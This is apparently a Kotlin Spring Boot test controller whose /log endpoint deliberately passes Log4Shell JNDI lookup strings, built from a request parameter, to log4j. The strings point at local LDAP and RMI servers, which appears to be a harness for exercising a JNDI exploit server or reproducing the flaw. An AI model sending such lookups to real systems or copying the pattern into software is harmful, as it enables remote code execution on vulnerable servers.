package springboot

import org.apache.logging.log4j.LogManager
import org.springframework.web.bind.annotation.RequestMapping
import org.springframework.web.bind.annotation.RequestParam
import org.springframework.web.bind.annotation.ResponseBody
import org.springframework.web.bind.annotation.RestController

@RestController
@RequestMapping("/")
class TestController {
    private val logger = LogManager.getLogger(TestController::class.java)

    @ResponseBody
    @RequestMapping("/log")
    fun log(@RequestParam type: String?, @RequestParam index: String?): String {
        if (type?.equals("ldap", true) == true) {
            logger.error(String.format("\${jndi:ldap://127.0.0.1:1389/%s}", index))
        } else {
            logger.error(String.format("\${jndi:rmi://127.0.0.1:1099/%s}", index))
        }
        return "200 OK"
    }
}
